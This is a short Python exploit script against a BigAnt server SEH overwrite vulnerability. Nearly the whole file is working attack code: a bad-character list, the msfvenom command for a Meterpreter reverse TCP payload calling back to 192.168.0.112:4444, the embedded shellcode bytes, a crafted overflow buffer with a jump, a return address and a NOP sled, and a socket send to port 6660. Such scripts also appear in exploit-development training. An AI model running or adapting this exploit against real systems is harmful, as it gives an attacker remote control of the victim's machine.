#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the SEH overwrite vulnerability in BigAnt server. 


#badchars = \x00\x0A\x0D\x20\x25

import sys, socket

# 0x0f9a3295 
#  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444  -b \x00\x0A\x0D\x20\x25 -f python


ip_addr = "192.168.0.109"



# 368 bytes shellcode

buf =  ""
buf += "\xbd\x05\x95\xbd\xa6\xda\xd6\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x56\x31\x6a\x13\x03\x6a\x13\x83\xc2\x01\x77"
buf += "\x48\x5a\xe1\xf5\xb3\xa3\xf1\x99\x3a\x46\xc0\x99\x59"
buf += "\x02\x72\x2a\x29\x46\x7e\xc1\x7f\x73\xf5\xa7\x57\x74"
buf += "\xbe\x02\x8e\xbb\x3f\x3e\xf2\xda\xc3\x3d\x27\x3d\xfa"
buf += "\x8d\x3a\x3c\x3b\xf3\xb7\x6c\x94\x7f\x65\x81\x91\xca"
buf += "\xb6\x2a\xe9\xdb\xbe\xcf\xb9\xda\xef\x41\xb2\x84\x2f"
buf += "\x63\x17\xbd\x79\x7b\x74\xf8\x30\xf0\x4e\x76\xc3\xd0"
buf += "\x9f\x77\x68\x1d\x10\x8a\x70\x59\x96\x75\x07\x93\xe5"
buf += "\x08\x10\x60\x94\xd6\x95\x73\x3e\x9c\x0e\x58\xbf\x71"
buf += "\xc8\x2b\xb3\x3e\x9e\x74\xd7\xc1\x73\x0f\xe3\x4a\x72"
buf += "\xc0\x62\x08\x51\xc4\x2f\xca\xf8\x5d\x95\xbd\x05\xbd"
buf += "\x76\x61\xa0\xb5\x9a\x76\xd9\x97\xf2\xbb\xd0\x27\x02"
buf += "\xd4\x63\x5b\x30\x7b\xd8\xf3\x78\xf4\xc6\x04\x09\x12"
buf += "\xf9\xdb\xb1\x73\x07\xdc\xc1\x5a\xcc\x88\x91\xf4\xe5"
buf += "\xb0\x7a\x05\x09\x65\x16\x0f\x9d\x46\x4e\x0f\x2d\x2f"
buf += "\x8c\x10\xdc\xf3\x19\xf6\x8e\x5b\x49\xa7\x6e\x0c\x29"
buf += "\x17\x07\x46\xa6\x48\x37\x69\x6d\xe1\xd2\x86\xdb\x59"
buf += "\x4b\x3e\x46\x11\xea\xbf\x5d\x5f\x2c\x4b\x57\x9f\xe3"
buf += "\xbc\x12\xb3\x14\xdb\xdc\x4b\xe5\x4e\xdc\x21\xe1\xd8"
buf += "\x8b\xdd\xeb\x3d\xfb\x41\x13\x68\x78\x85\xeb\xed\x48"
buf += "\xfd\xda\x7b\xf4\x69\x23\x6c\xf4\x69\x75\xe6\xf4\x01"
buf += "\x21\x52\xa7\x34\x2e\x4f\xd4\xe4\xbb\x70\x8c\x59\x6b"
buf += "\x19\x32\x87\x5b\x86\xcd\xe2\xdf\xc1\x31\x70\xc8\x69"
buf += "\x59\x8a\x48\x8a\x99\xe0\x48\xda\xf1\xff\x67\xd5\x31"
buf += "\xff\xad\xbe\x59\x8a\x23\x0c\xf8\x8b\x69\xd0\xa4\x8c"
buf += "\x9e\xc9\x57\xf6\xef\xee\x98\x07\xe6\x8a\x99\x07\x06"
buf += "\xad\xa6\xd1\x3f\xdb\xe9\xe1\x7b\xd4\x5c\x47\x2d\x7f"
buf += "\x9e\xdb\x2d\xaa"


# +  
buffer = "A" * 576 + buf + "B" *13 +  "\xE9\x6B\xFE\xFF\xFF" + "\xEB\xF4\x74\x06" + "\x95\x32\x9a\x0f" + "\x90" * 800

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip_addr, 6660))
s.send("USV "+ buffer + "\r\n\r\n")
s.close()
